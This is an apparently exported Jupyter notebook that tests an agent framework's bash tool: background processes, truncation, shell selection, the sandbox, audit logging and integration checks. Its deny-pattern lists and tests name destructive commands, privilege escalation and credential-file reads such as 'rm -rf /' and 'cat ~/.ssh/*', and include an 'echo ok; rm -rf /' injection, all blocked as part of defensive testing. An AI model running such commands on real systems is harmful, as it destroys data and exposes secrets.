result = await kill_shell(pid=pid)
print(f"  3. Kill result: {result}")

# Verify dead (should get not found since kill removes from registry)
output = await bash_output(pid=pid)
print(f"  4. After kill: {output}")
assert "not found" in output.lower() or "completed" in output.lower()
print("\n  PASS: Full lifecycle completed")

Full background process lifecycle:

  1. Started: PID 40983
  2. Read 10 lines
  3. Kill result: Process 40983 terminated successfully
  4. After kill: Error: Process not found

  PASS: Full lifecycle completed


### Try It Yourself: Background Processes

Experiment with background process management:
- Start a process that writes to a file in the background
- Monitor a process that produces output in bursts
- Try starting multiple background processes and reading from each

In [43]:
# Your turn! Experiment with background processes:
# result = await bash("your_long_command", run_in_background=True)
# pid = result.split("PID: ")[1].strip()
# output = await bash_output(pid=pid, timeout=2000)
# await kill_shell(pid=pid)

---

## Section 8: Output Truncation

Output is truncated using two independent limits:

| Constant | Value | Applied to |
|----------|-------|------------|
| `MAX_OUTPUT_LINES` | 2,000 | `bash()` |
| `MAX_OUTPUT_BYTES` | 50 KB | `bash()` and `bash_output()` |
| `MAX_BUFFER_LINES` | 10,000 | Background process buffer |

When truncated, full output is saved to a temp file.

In [44]:
# Check the constants
from rawagents.tools.builtin.shell.bash import MAX_OUTPUT_BYTES, MAX_OUTPUT_LINES
from rawagents.tools.builtin.shell.bash_output import (
    MAX_OUTPUT_BYTES as BASH_OUTPUT_MAX_BYTES,
)


print(f"bash MAX_OUTPUT_LINES:       {MAX_OUTPUT_LINES:,}")
print(f"bash MAX_OUTPUT_BYTES:       {MAX_OUTPUT_BYTES:,} ({MAX_OUTPUT_BYTES//1024}KB)")
print(f"bash_output MAX_OUTPUT_BYTES: {BASH_OUTPUT_MAX_BYTES:,} ({BASH_OUTPUT_MAX_BYTES//1024}KB)")
print(f"ProcessInfo MAX_BUFFER_LINES: {ProcessInfo.MAX_BUFFER_LINES:,}")

bash MAX_OUTPUT_LINES:       2,000
bash MAX_OUTPUT_BYTES:       51,200 (50KB)
bash_output MAX_OUTPUT_BYTES: 51,200 (50KB)
ProcessInfo MAX_BUFFER_LINES: 10,000


In [45]:
# Generate output that exceeds the line limit
# 2,500 lines should trigger truncation at 2,000
result = await bash("for i in $(seq 1 2500); do echo line_$i; done")

# Check for truncation notice
if "truncated" in result:
    print("Output was truncated (as expected)")
    assert_contains(result, "output truncated", "Truncation notice present")
    assert_contains(result, "Full output saved to:", "Temp file path present")

    # Extract temp file path
    for line in result.split('\n'):
        if 'saved to:' in line:
            temp_path = line.split('saved to:')[1].strip()
            print(f"  Full output at: {temp_path}")
            if Path(temp_path).exists():
                full_lines = Path(temp_path).read_text().split('\n')
                print(f"  Full output lines: {len(full_lines)}")
                assert len(full_lines) >= 2500
                print("  PASS: Full output preserved in temp file")
else:
    print("Output was not truncated (command may have been too fast)")
    print(f"  Output lines: {len(result.split(chr(10)))}")

Output was truncated (as expected)
  PASS: Truncation notice present
  PASS: Temp file path present
  Full output at: /var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_bash_jbwyd87n.txt
  Full output lines: 2501
  PASS: Full output preserved in temp file


### Try It Yourself: Truncation

Experiment with output limits:
- Generate output exceeding 50KB to trigger byte truncation
- Check if the temp file contains the full output
- Try `bash_output()` truncation on a verbose background process

In [46]:
# Your turn! Test truncation limits:
# Generate large output: await bash("python3 -c \"print('x' * 100000)\"")
# Check temp file: look for "Full output saved to:" in the result

---

## Section 9: Shell Selection

The shell binary is selected with this priority:
1. Explicit `shell_path` (if set)
2. `$SHELL` environment variable (if compatible)
3. `/bin/zsh` (macOS only, if exists)
4. `/bin/bash` (if exists)
5. `/bin/sh` (last resort)

**Incompatible shells** (non-POSIX syntax): fish, nu, nushell, xonsh, elvish, ion, murex

In [47]:
# Check current shell selection
ctx = get_shell_security_context()
detected_shell = ctx.get_shell()
env_shell = os.environ.get('SHELL', 'not set')

print(f"$SHELL env var:  {env_shell}")
print(f"Detected shell:  {detected_shell}")
print(f"shell_path:      {ctx.shell_path or '(auto-detect)'}")
print(f"\nIncompatible shells: {sorted(ctx.INCOMPATIBLE_SHELLS)}")

$SHELL env var:  /bin/zsh
Detected shell:  /bin/zsh
shell_path:      (auto-detect)

Incompatible shells: ['elvish', 'fish', 'ion', 'murex', 'nu', 'nushell', 'xonsh']


In [48]:
# Override shell selection
if Path("/bin/sh").exists():
    ctx = reset_context(shell_path="/bin/sh")
    assert ctx.get_shell() == "/bin/sh"
    print("  PASS: Custom shell_path=/bin/sh overrides auto-detection")

    result = await bash("echo $0")  # Show which shell is running
    print(f"  Running shell: {result.strip()}")

# Reset
reset_context()

  PASS: Custom shell_path=/bin/sh overrides auto-detection
  Running shell: /bin/sh


ShellSecurityContext(workspace='/var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c', deny_patterns=['rm -rf /*', 'rm -rf /', 'rm -rf ~/*', 'rm -rf ~', 'rm -rf .', 'rm -rf ..', 'rmdir /*', 'rm -rf /home/*', 'rm -rf /var/*', 'rm -rf /etc/*', 'rm -rf /usr/*', 'dd if=*', 'mkfs*', 'fdisk*', 'parted*', 'wipefs*', 'shred *', 'sudo *', 'sudo su*', 'su *', 'su -*', 'doas *', 'pkexec *', 'runas *', 'chmod +s *', 'chmod u+s *', 'chmod g+s *', 'chmod 777 /*', 'chmod -R 777 /*', 'chown -R * /*', 'chattr *', 'setenforce *', 'systemctl disable*', 'systemctl mask*', 'service * stop', 'git push --force*', 'git push -f*', 'git push *--force*', 'git push *-f *', 'git reset --hard*', 'git clean -fd*', 'git clean -f*', 'git checkout -- .', 'git restore .', 'git branch -D *', ':(){ :|:& };:', '*:(){ :|:& };:*', 'fork()', 'while true; do*', 'yes |*', 'cat ~/.bash_history', 'cat ~/.zsh_history', 'cat ~/.ssh/*', 'cat /etc/shadow', 'cat /etc/passwd', 'cat ~/.netrc', 'cat ~/.aws/*', '

In [49]:
# Demonstrate incompatible shell detection
import warnings


# Temporarily set $SHELL to an incompatible shell
old_shell = os.environ.get('SHELL')
os.environ['SHELL'] = '/usr/bin/fish'  # fish is incompatible

with warnings.catch_warnings(record=True) as w:
    warnings.simplefilter("always")
    ctx = ShellSecurityContext(workspace=str(WORKSPACE))
    shell = ctx.get_shell()

    if w:
        print(f"  Warning issued: {w[0].message}")
    print(f"  Fallback shell: {shell}")
    assert "fish" not in shell, "Should not use fish"
    print(f"  PASS: Incompatible shell detected, fell back to {shell}")

# Restore
if old_shell:
    os.environ['SHELL'] = old_shell
else:
    os.environ.pop('SHELL', None)
reset_context()

  Fallback shell: /bin/zsh
  PASS: Incompatible shell detected, fell back to /bin/zsh


ShellSecurityContext(workspace='/var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c', deny_patterns=['rm -rf /*', 'rm -rf /', 'rm -rf ~/*', 'rm -rf ~', 'rm -rf .', 'rm -rf ..', 'rmdir /*', 'rm -rf /home/*', 'rm -rf /var/*', 'rm -rf /etc/*', 'rm -rf /usr/*', 'dd if=*', 'mkfs*', 'fdisk*', 'parted*', 'wipefs*', 'shred *', 'sudo *', 'sudo su*', 'su *', 'su -*', 'doas *', 'pkexec *', 'runas *', 'chmod +s *', 'chmod u+s *', 'chmod g+s *', 'chmod 777 /*', 'chmod -R 777 /*', 'chown -R * /*', 'chattr *', 'setenforce *', 'systemctl disable*', 'systemctl mask*', 'service * stop', 'git push --force*', 'git push -f*', 'git push *--force*', 'git push *-f *', 'git reset --hard*', 'git clean -fd*', 'git clean -f*', 'git checkout -- .', 'git restore .', 'git branch -D *', ':(){ :|:& };:', '*:(){ :|:& };:*', 'fork()', 'while true; do*', 'yes |*', 'cat ~/.bash_history', 'cat ~/.zsh_history', 'cat ~/.ssh/*', 'cat /etc/shadow', 'cat /etc/passwd', 'cat ~/.netrc', 'cat ~/.aws/*', '

---

## Section 10: Environment File Sourcing

Set `env_file` to a shell script that gets sourced before each command, enabling persistent environment variables.

Can also be set via `RAWAGENTS_ENV_FILE` environment variable.

In [50]:
# Create an env file
env_file = WORKSPACE / "test_env.sh"
env_file.write_text('export MY_TEST_VAR="hello_from_env_file"\nexport MY_NUMBER=42\n')

ctx = reset_context(env_file=str(env_file))
print(f"env_file: {ctx.env_file}")

# Commands now have access to sourced variables
result = await bash("echo $MY_TEST_VAR")
show_result(result, "Accessing env_file variable")
assert_contains(result, "hello_from_env_file", "Variable from env_file")

result = await bash("echo $MY_NUMBER")
assert_contains(result, "42", "Second variable from env_file")

env_file: /var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c/test_env.sh

[OK] Accessing env_file variable
hello_from_env_file
  PASS: Variable from env_file
  PASS: Second variable from env_file


In [51]:
# Non-existent env_file emits a warning
with warnings.catch_warnings(record=True) as w:
    warnings.simplefilter("always")
    ctx = ShellSecurityContext(
        workspace=str(WORKSPACE),
        env_file="/nonexistent/env_file.sh",
    )
    if w:
        print(f"Warning: {w[0].message}")
        assert "does not exist" in str(w[0].message)
        print("  PASS: Warning issued for missing env_file")

# Reset
reset_context()

  PASS: Warning issued for missing env_file


ShellSecurityContext(workspace='/var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c', deny_patterns=['rm -rf /*', 'rm -rf /', 'rm -rf ~/*', 'rm -rf ~', 'rm -rf .', 'rm -rf ..', 'rmdir /*', 'rm -rf /home/*', 'rm -rf /var/*', 'rm -rf /etc/*', 'rm -rf /usr/*', 'dd if=*', 'mkfs*', 'fdisk*', 'parted*', 'wipefs*', 'shred *', 'sudo *', 'sudo su*', 'su *', 'su -*', 'doas *', 'pkexec *', 'runas *', 'chmod +s *', 'chmod u+s *', 'chmod g+s *', 'chmod 777 /*', 'chmod -R 777 /*', 'chown -R * /*', 'chattr *', 'setenforce *', 'systemctl disable*', 'systemctl mask*', 'service * stop', 'git push --force*', 'git push -f*', 'git push *--force*', 'git push *-f *', 'git reset --hard*', 'git clean -fd*', 'git clean -f*', 'git checkout -- .', 'git restore .', 'git branch -D *', ':(){ :|:& };:', '*:(){ :|:& };:*', 'fork()', 'while true; do*', 'yes |*', 'cat ~/.bash_history', 'cat ~/.zsh_history', 'cat ~/.ssh/*', 'cat /etc/shadow', 'cat /etc/passwd', 'cat ~/.netrc', 'cat ~/.aws/*', '

---

## Section 11: OS-Level Sandbox

The third security layer wraps commands in OS-level sandboxes:

| Platform | Tool | Capabilities |
|----------|------|-------------|
| Linux | `bwrap` (bubblewrap) | Namespace isolation, read-only FS, network isolation |
| macOS | `sandbox-exec` (Seatbelt) | Profile-based deny/allow, path blocking |
| Windows | Not supported | Warning emitted, runs unsandboxed |

Sandbox configuration:
- `enable_sandbox`: Turn on sandboxing
- `sandbox_allow_network`: Allow network access
- `sandbox_allow_write_paths`: Additional writable paths
- `sandbox_deny_read_paths`: Paths blocked from reading (default: ~/.ssh, ~/.aws, etc.)

In [52]:
# Check sandbox availability
import platform
import shutil


system = platform.system()
print(f"Platform: {system}")

if system == "Linux":
    bwrap = shutil.which("bwrap")
    print(f"bwrap available: {bool(bwrap)} ({bwrap or 'not found'})")
elif system == "Darwin":
    sandbox_exec = shutil.which("sandbox-exec")
    print(f"sandbox-exec available: {bool(sandbox_exec)} ({sandbox_exec or 'not found'})")
else:
    print("Sandboxing not supported on this platform")

print(f"is_docker(): {is_docker()}")

Platform: Darwin
sandbox-exec available: True (/usr/bin/sandbox-exec)
is_docker(): False


In [53]:
# View default sandbox deny read paths
ctx = ShellSecurityContext(workspace=str(WORKSPACE))
print("Default sandbox_deny_read_paths:")
for path in ctx.sandbox_deny_read_paths:
    print(f"  - {path}")

Default sandbox_deny_read_paths:
  - ~/.ssh
  - ~/.gnupg
  - ~/.aws
  - ~/.config/gcloud
  - ~/.kube
  - ~/.netrc
  - ~/.gitconfig
  - ~/.docker/config.json


In [54]:
# View what a sandbox command would look like (without enabling)
ctx = ShellSecurityContext(
    workspace=str(WORKSPACE),
    enable_sandbox=False,  # Don't actually enable
)

# Manually preview the sandbox command construction
if system == "Linux":
    print("Preview: Linux bwrap command structure")
    # Show what _build_bubblewrap_command would generate
    print("  bwrap --ro-bind /usr /usr --ro-bind /lib /lib ...")
    print(f"  --bind {WORKSPACE} {WORKSPACE}")
    print("  --unshare-net  (if network disabled)")
    print("  --die-with-parent")
    print(f"  {ctx.get_shell()} -c 'command'")
elif system == "Darwin":
    print("Preview: macOS seatbelt profile")
    print("  (version 1)")
    print("  (deny default)")
    print("  (allow process-exec)")
    print("  (allow file-read*)")
    for p in ctx.sandbox_deny_read_paths:
        expanded = Path(p).expanduser()
        print(f'  (deny file-read* (subpath "{expanded}"))')
    print(f'  (allow file-write* (subpath "{WORKSPACE}"))')

# Attempt to enable sandbox (may fail if tools not available)
try:
    ctx = ShellSecurityContext(
        workspace=str(WORKSPACE),
        enable_sandbox=True,
    )
    print("\nSandbox enabled successfully!")

    # Test a sandboxed command
    set_shell_security_context(ctx)
    result = await bash("echo 'sandboxed!'")
    show_result(result, "Sandboxed command")
except SandboxNotAvailableError as e:
    print(f"\nSandbox not available: {e}")
    print("(This is expected if sandbox tools are not installed)")

# Reset
reset_context()

Preview: macOS seatbelt profile
  (version 1)
  (deny default)
  (allow process-exec)
  (allow file-read*)
  (deny file-read* (subpath "/Users/tawab/.ssh"))
  (deny file-read* (subpath "/Users/tawab/.gnupg"))
  (deny file-read* (subpath "/Users/tawab/.aws"))
  (deny file-read* (subpath "/Users/tawab/.config/gcloud"))
  (deny file-read* (subpath "/Users/tawab/.kube"))
  (deny file-read* (subpath "/Users/tawab/.netrc"))
  (deny file-read* (subpath "/Users/tawab/.gitconfig"))
  (deny file-read* (subpath "/Users/tawab/.docker/config.json"))
  (allow file-write* (subpath "/var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c"))

Sandbox enabled successfully!

[FAIL] Sandboxed command
Error: Command failed with exit code 1



ShellSecurityContext(workspace='/var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c', deny_patterns=['rm -rf /*', 'rm -rf /', 'rm -rf ~/*', 'rm -rf ~', 'rm -rf .', 'rm -rf ..', 'rmdir /*', 'rm -rf /home/*', 'rm -rf /var/*', 'rm -rf /etc/*', 'rm -rf /usr/*', 'dd if=*', 'mkfs*', 'fdisk*', 'parted*', 'wipefs*', 'shred *', 'sudo *', 'sudo su*', 'su *', 'su -*', 'doas *', 'pkexec *', 'runas *', 'chmod +s *', 'chmod u+s *', 'chmod g+s *', 'chmod 777 /*', 'chmod -R 777 /*', 'chown -R * /*', 'chattr *', 'setenforce *', 'systemctl disable*', 'systemctl mask*', 'service * stop', 'git push --force*', 'git push -f*', 'git push *--force*', 'git push *-f *', 'git reset --hard*', 'git clean -fd*', 'git clean -f*', 'git checkout -- .', 'git restore .', 'git branch -D *', ':(){ :|:& };:', '*:(){ :|:& };:*', 'fork()', 'while true; do*', 'yes |*', 'cat ~/.bash_history', 'cat ~/.zsh_history', 'cat ~/.ssh/*', 'cat /etc/shadow', 'cat /etc/passwd', 'cat ~/.netrc', 'cat ~/.aws/*', '

### 11.1 The `dangerously_disable_sandbox` Parameter

The `bash()` tool accepts `dangerously_disable_sandbox=True` to bypass OS-level sandbox wrapping for a single command. This does **not** bypass the deny-pattern security layer -- it only skips the `bwrap`/`seatbelt` wrapper.

Use this only when a command is incompatible with the sandbox (e.g., accessing hardware devices).

In [55]:
# dangerously_disable_sandbox bypasses sandbox but NOT deny patterns
reset_context()

# Safe command works with the flag
result = await bash("echo sandbox_bypass_test", dangerously_disable_sandbox=True)
assert_success(result, "Safe command works with dangerously_disable_sandbox=True")
assert_contains(result, "sandbox_bypass_test", "Output correct")

# Dangerous command is STILL blocked (deny patterns always apply)
result = await bash("rm -rf /", dangerously_disable_sandbox=True)
assert_error(result, "blocked", "Deny patterns still enforced even with sandbox disabled")

print("\n  KEY: dangerously_disable_sandbox only skips OS sandbox, NOT deny patterns")

  PASS: Safe command works with dangerously_disable_sandbox=True
  PASS: Output correct
  PASS: Deny patterns still enforced even with sandbox disabled

  KEY: dangerously_disable_sandbox only skips OS sandbox, NOT deny patterns


---

## Section 12: Error Handling and Audit Logging

### Structured Errors
- `ShellError` dataclass with severity, message, command, exit_code, stderr, suggestion
- `ErrorSeverity` enum: INFO, WARNING, ERROR, SECURITY
- `suggest_fix()` matches common error patterns to suggestions

### Audit Logging
- `ShellAuditLogger` logs JSON events: command_executed, security_blocked, background_started
- All entries include ISO 8601 timestamps, commands truncated to 200 chars

### Recovery
- `execute_with_recovery()` retries transient failures automatically

In [56]:
# ShellError dataclass
error = ShellError(
    severity=ErrorSeverity.ERROR,
    message="Command failed",
    command="npm install",
    exit_code=1,
    stderr="EACCES: permission denied, access '/usr/local/lib'",
    suggestion="Check file permissions or try a different directory",
)

print("ShellError.to_user_message():")
print(error.to_user_message())
print(f"\nSeverity: {error.severity}")
print("Note: stderr is truncated to 500 chars in to_user_message()")

ShellError.to_user_message():
Error: Command failed
Exit code: 1
Details: EACCES: permission denied, access '/usr/local/lib'
Suggestion: Check file permissions or try a different directory

Severity: ErrorSeverity.ERROR
Note: stderr is truncated to 500 chars in to_user_message()


In [57]:
# ErrorSeverity levels
print("ErrorSeverity levels:")
for sev in ErrorSeverity:
    print(f"  {sev.name:10s} = {sev.value}")

ErrorSeverity levels:
  INFO       = info
  WARNING    = warning
  ERROR      = error
  SECURITY   = security


In [58]:
# suggest_fix() matches common error patterns
test_errors = [
    "bash: npm: command not found",
    "Permission denied (publickey)",
    "No such file or directory",
    "Cannot allocate memory",
    "Connection refused",
    "Disk quota exceeded",
    "Operation timed out",
    "Something completely unknown",
]

print("Error -> Suggestion mapping:\n")
for err_msg in test_errors:
    suggestion = suggest_fix(err_msg)
    if suggestion:
        print(f"  '{err_msg[:40]}...'")
        print(f"    -> {suggestion}")
    else:
        print(f"  '{err_msg[:40]}...'")
        print("    -> (no suggestion)")

Error -> Suggestion mapping:

  'bash: npm: command not found...'
    -> Check if the command is installed and in PATH
  'Permission denied (publickey)...'
    -> Check file permissions or try a different directory
  'No such file or directory...'
    -> Verify the path exists
  'Cannot allocate memory...'
    -> Close other applications or increase memory
  'Connection refused...'
    -> Check if the service is running
  'Disk quota exceeded...'
    -> Free up disk space
  'Operation timed out...'
    -> (no suggestion)
  'Something completely unknown...'
    -> (no suggestion)


In [59]:
# Audit logging
import json
import logging


# Create an in-memory log handler to capture audit events
log_records = []

class ListHandler(logging.Handler):
    def emit(self, record):
        log_records.append(record.getMessage())

# Configure audit logging
configure_audit_logging()  # Enable without file
audit = get_audit_logger()

# Add our list handler
handler = ListHandler()
audit.logger.addHandler(handler)
audit.logger.setLevel(logging.DEBUG)

# Execute a command to generate audit events
await bash("echo audit_test")

# Check captured events
print(f"Captured {len(log_records)} audit events:")
for record in log_records:
    try:
        data = json.loads(record)
        print(f"  Event: {data.get('event', 'unknown')}")
        print(f"    Command: {data.get('command', 'N/A')}")
        print(f"    Duration: {data.get('duration_ms', 'N/A')}ms")
    except json.JSONDecodeError:
        print(f"  Raw: {record[:80]}")

# Clean up handler
audit.logger.removeHandler(handler)
log_records.clear()

Captured 1 audit events:
  Event: command_executed
    Command: echo audit_test
    Duration: 13.24ms


In [60]:
# execute_with_recovery() - retry transient failures
print("Testing execute_with_recovery():\n")

# Success case
output, error = await execute_with_recovery("echo recovery_test")
assert error is None, "Should succeed"
assert_contains(output, "recovery_test", "Success with no retries")

# Failure case (non-retryable: command not found)
output, error = await execute_with_recovery(
    "nonexistent_xyz",
    max_retries=2,
    retry_delay=0.1,
)
assert error is not None, "Should fail"
print(f"  Error severity: {error.severity}")
print(f"  Error message: {error.message[:60]}...")
if error.suggestion:
    print(f"  Suggestion: {error.suggestion}")
print("  PASS: Non-retryable error breaks immediately (no wasted retries)")

Testing execute_with_recovery():

  PASS: Success with no retries
  Error severity: ErrorSeverity.ERROR
  Error message: Error: Command failed with exit code 127
/bin/sh: nonexisten...
  Suggestion: Check if the command is installed and in PATH
  PASS: Non-retryable error breaks immediately (no wasted retries)


---

## Section 13: Streaming Utilities

The `_utils.py` module provides async streaming for real-time output:
- `stream_output()` -- async generator yielding lines as they arrive
- `stream_with_timeout()` -- collect streamed output with a timeout

In [61]:
# stream_output() - async generator
process = await asyncio.create_subprocess_shell(
    "for i in 1 2 3; do echo stream_$i; sleep 0.1; done",
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.STDOUT,
    cwd=str(WORKSPACE),
)

lines_received = []
async for line in stream_output(process):
    lines_received.append(line)
    print(f"  Received: {line}")

assert len(lines_received) == 3, f"Expected 3 lines, got {len(lines_received)}"
print(f"\n  PASS: Streamed {len(lines_received)} lines")

  Received: stream_1
  Received: stream_2
  Received: stream_3

  PASS: Streamed 3 lines


In [62]:
# stream_output() with callback
callback_lines = []

process = await asyncio.create_subprocess_shell(
    "echo alpha; echo beta; echo gamma",
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.STDOUT,
    cwd=str(WORKSPACE),
)

async for line in stream_output(process, on_line=lambda l: callback_lines.append(l)):
    pass  # Callback handles it

print(f"Callback received: {callback_lines}")
assert callback_lines == ["alpha", "beta", "gamma"]
print("  PASS: Callback received all lines")

Callback received: ['alpha', 'beta', 'gamma']
  PASS: Callback received all lines


In [63]:
# stream_with_timeout()
process = await asyncio.create_subprocess_shell(
    "for i in $(seq 1 5); do echo line_$i; sleep 0.1; done",
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.STDOUT,
    cwd=str(WORKSPACE),
)

lines, timed_out = await stream_with_timeout(process, timeout_seconds=5.0)
print(f"Lines collected: {len(lines)}")
print(f"Timed out: {timed_out}")
assert not timed_out, "Should not time out"
assert len(lines) == 5
print("  PASS: Collected all lines without timeout")

# Now test with an actual timeout
process = await asyncio.create_subprocess_shell(
    "for i in $(seq 1 100); do echo line_$i; sleep 0.1; done",
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.STDOUT,
    cwd=str(WORKSPACE),
    start_new_session=True,
)

import os as _os
import signal


lines, timed_out = await stream_with_timeout(process, timeout_seconds=0.5)
print("\nWith 0.5s timeout:")
print(f"  Lines collected: {len(lines)}")
print(f"  Timed out: {timed_out}")
assert timed_out, "Should time out"
assert len(lines) < 100, "Should not have all lines"
print(f"  PASS: Timed out with {len(lines)} partial lines")

# Clean up the process
try:
    pgid = _os.getpgid(process.pid)
    _os.killpg(pgid, signal.SIGKILL)
except (ProcessLookupError, OSError):
    pass
await process.wait()

Lines collected: 5
Timed out: False
  PASS: Collected all lines without timeout

With 0.5s timeout:
  Lines collected: 5
  Timed out: True
  PASS: Timed out with 5 partial lines


-9

---

## Section 14: ProcessManager Internals

The `ProcessManager` is a module-level singleton (not a `ContextVar`) because OS processes are global.

**Key details:**
- `ProcessInfo` tracks: pid, process, command, started_at, output_buffer, last_read_index
- `MAX_BUFFER_LINES = 10,000` with FIFO eviction
- `asyncio.Event` signals new output for immediate wake-up
- `asyncio.Lock` for concurrent access safety

In [64]:
# ProcessManager is a singleton
pm1 = get_process_manager()
pm2 = get_process_manager()
assert pm1 is pm2, "Should be same instance"
print(f"ProcessManager singleton: {pm1}")
print(f"  Same instance: {pm1 is pm2}")
print("  PASS: Singleton pattern verified")

ProcessManager singleton: <rawagents.tools.builtin.shell._process_manager.ProcessManager object at 0x115d1af90>
  Same instance: True
  PASS: Singleton pattern verified


In [65]:
# ProcessInfo fields
print("ProcessInfo fields:")
print(f"  MAX_BUFFER_LINES: {ProcessInfo.MAX_BUFFER_LINES:,}")
print("\n  Instance fields:")
print("    pid: int")
print("    process: asyncio.subprocess.Process")
print("    command: str")
print("    started_at: datetime")
print("    output_buffer: list[str]")
print("    last_read_index: int")
print("    _new_output_event: asyncio.Event")
print("    _collect_task: asyncio.Task | None")
print("\n  Properties:")
print("    is_running -> bool")
print("    exit_code -> int | None")

ProcessInfo fields:
  MAX_BUFFER_LINES: 10,000

  Instance fields:
    pid: int
    process: asyncio.subprocess.Process
    command: str
    started_at: datetime
    output_buffer: list[str]
    last_read_index: int
    _new_output_event: asyncio.Event
    _collect_task: asyncio.Task | None

  Properties:
    is_running -> bool
    exit_code -> int | None


---

## Section 15: Integration Tests

Combined tests that exercise multiple features together.

In [66]:
# Concurrent command execution
reset_context()
print("Testing concurrent execution:\n")

results = await asyncio.gather(
    bash("echo task_A; sleep 0.1; echo done_A"),
    bash("echo task_B; sleep 0.1; echo done_B"),
    bash("echo task_C; sleep 0.1; echo done_C"),
)

for i, result in enumerate(results):
    label = chr(65 + i)  # A, B, C
    assert f"task_{label}" in result, f"Task {label} output missing"
    assert f"done_{label}" in result, f"Task {label} completion missing"
    print(f"  Task {label}: {result.strip()[:50]}")

print("\n  PASS: All 3 concurrent commands completed")

Testing concurrent execution:

  Task A: task_A
done_A
  Task B: task_B
done_B
  Task C: task_C
done_C

  PASS: All 3 concurrent commands completed


In [67]:
# Unicode handling
print("Testing Unicode handling:\n")

unicode_tests = [
    ("echo 'Hello World'", "Hello World", "ASCII"),
    ("echo 'Caf\u00e9 na\u00efve'", "Caf\u00e9", "Latin accents"),
    ("echo 'Tokyo: \u6771\u4eac'", "\u6771\u4eac", "CJK characters"),
    ("echo 'Math: \u2200x \u2208 \u2124'", "\u2200", "Math symbols"),
]

for cmd, expected, desc in unicode_tests:
    result = await bash(cmd)
    assert expected in result, f"Expected '{expected}' in: {result}"
    print(f"  {desc}: {result.strip()}")

print("\n  PASS: Unicode handled correctly")

Testing Unicode handling:

  ASCII: Hello World
  Latin accents: Café naïve
  CJK characters: Tokyo: 東京
  Math symbols: Math: ∀x ∈ ℤ

  PASS: Unicode handled correctly


In [68]:
# Security + execution combined workflow
reset_context()
print("Security + execution workflow:\n")

# Safe commands execute
result = await bash("echo step1_safe")
assert_success(result, "Step 1: safe command")

# Dangerous command is blocked (no side effects)
result = await bash("echo ok; rm -rf /")
assert_error(result, "blocked", "Step 2: injection blocked")

# Next safe command still works (state not corrupted)
result = await bash("echo step3_still_works")
assert_success(result, "Step 3: state not corrupted after block")
assert_contains(result, "step3_still_works", "Correct output")

print("\n  PASS: Security blocks don't corrupt execution state")

{"event": "security_blocked", "timestamp": "2026-02-08T22:32:54.022874", "command": "echo ok; rm -rf /", "reason": "deny_pattern_match", "pattern": "*; rm -rf *"}


Security + execution workflow:

  PASS: Step 1: safe command
  PASS: Step 2: injection blocked
  PASS: Step 3: state not corrupted after block
  PASS: Correct output

  PASS: Security blocks don't corrupt execution state


In [69]:
# File operations through bash
reset_context()
test_dir = WORKSPACE / "integration_test"
test_dir.mkdir(exist_ok=True)

print("File operations via bash:\n")

# Create a file
result = await bash(f"echo 'hello world' > {test_dir}/test.txt")
assert_success(result, "Create file")

# Read it back
result = await bash(f"cat {test_dir}/test.txt")
assert_contains(result, "hello world", "Read file content")

# Modify it
result = await bash(f"echo 'line 2' >> {test_dir}/test.txt")
assert_success(result, "Append to file")

# Verify modification
result = await bash(f"wc -l < {test_dir}/test.txt")
assert_contains(result, "2", "File has 2 lines")

# List directory
result = await bash(f"ls -la {test_dir}")
assert_contains(result, "test.txt", "File listed")

print("\n  PASS: File operations work through bash")

File operations via bash:

  PASS: Create file
  PASS: Read file content
  PASS: Append to file
  PASS: File has 2 lines
  PASS: File listed

  PASS: File operations work through bash


---

## Section 16: Cleanup

Clean up the temporary workspace and any remaining background processes.

In [70]:
# Clean up any remaining background processes
pm = get_process_manager()
await pm.cleanup()
print("Background processes cleaned up")

# Clean up temp workspace
# Uncomment when done testing:
# cleanup_workspace()

Background processes cleaned up


---

## Section 17: Summary

### What We Tested

| Section | Feature | Status |
|---------|---------|--------|
| 2 | Basic command execution, output, errors | Tested |
| 3 | Timeout handling, clamping, env overrides | Tested |
| 4 | Deny patterns (159), injection detection, custom patterns | Tested |
| 5 | Allowlist mode | Tested |
| 6 | Working directory tracking (cd, cd -, cd ~, chained, failed) | Tested |
| 7 | Background processes (start, read, kill, already-terminated, lifecycle) | Tested |
| 8 | Output truncation (lines, bytes, temp files) | Tested |
| 9 | Shell selection (auto-detect, custom, incompatible fallback) | Tested |
| 10 | Environment file sourcing | Tested |
| 11 | OS-level sandbox config, `dangerously_disable_sandbox` | Tested |
| 12 | Error handling, suggestions, audit logging, retry recovery | Tested |
| 13 | Streaming utilities (stream_output, stream_with_timeout) | Tested |
| 14 | ProcessManager internals (singleton, ProcessInfo) | Tested |
| 15 | Integration (concurrent, unicode, security+exec, file ops) | Tested |

### Architecture Recap

```
Agent / LLM
    |
    +-- bash()          -- Security check -> Subprocess -> Output
    +-- bash_output()   -- ProcessManager.get_output() -> Event-based wait
    +-- kill_shell()    -- ProcessManager.kill() -> Process group signal
    |
    +-- ShellSecurityContext (ContextVar: per-async-task)
    |   +-- 159 deny patterns (glob matching)
    |   +-- Allowlist mode
    |   +-- Timeout validation
    |   +-- Shell selection
    |   +-- Working directory tracking
    |   +-- Sandbox builders (bwrap / seatbelt)
    |
    +-- ProcessManager (Module singleton: global)
    |   +-- ProcessInfo per process
    |   +-- 10,000-line FIFO buffer
    |   +-- asyncio.Event signaling
    |
    +-- ShellAuditLogger (JSON event logging)
    +-- execute_with_recovery (retry + suggestions)
    +-- stream_output / stream_with_timeout
```

### Next Steps

1. Run the full test suite: `pytest tests/tools/builtin/shell/ -v`
2. Read the README: `src/rawagents/tools/builtin/shell/README.md`
3. Review the PRD: `docs/prds/006_command_execution_tools_v1.md`

### Troubleshooting

| Issue | Solution |
|-------|----------|
| No `ShellSecurityContext` set | Run the Setup section first or call `set_shell_security_context()` |
| "Command blocked" for safe command | Check `deny_patterns` or switch to `allow_patterns` |
